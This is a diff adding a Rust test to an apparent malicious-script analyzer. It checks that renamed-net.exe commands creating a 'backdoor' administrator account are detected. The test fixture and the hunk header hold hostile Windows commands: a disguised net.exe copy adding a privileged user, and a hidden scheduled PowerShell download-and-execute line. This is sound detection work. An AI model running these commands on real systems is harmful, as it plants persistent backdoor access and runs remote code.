@@ -2956,6 +2956,45 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn copied_net_alias_emits_account_modification_traits() {
+        let script = br#"copy C:\Windows\System32\net.exe C:\Users\Public\nt.tmp
+C:\Users\Public\nt.tmp user backdoor P@ssw0rd /add
+C:\Users\Public\nt.tmp localgroup Administrators backdoor /ADD
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\nt.tmp"#)
+            )),
+            "copied net alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::AccountModification { action, account, .. }
+                    if action == "local-user-add" && account == "backdoor"
+            )),
+            "missing copied-net local-user-add: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::AccountModification { action, account, group, .. }
+                    if action == "localgroup-add"
+                        && account == "backdoor"
+                        && group.as_deref() == Some("Administrators")
+            )),
+            "missing copied-net localgroup-add: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn account_modification_preserves_full_command_context() {
         let comment = "A".repeat(260);
         let script = format!("net user support P@ssw0rd /add /comment:\"{comment}\"\r\n");
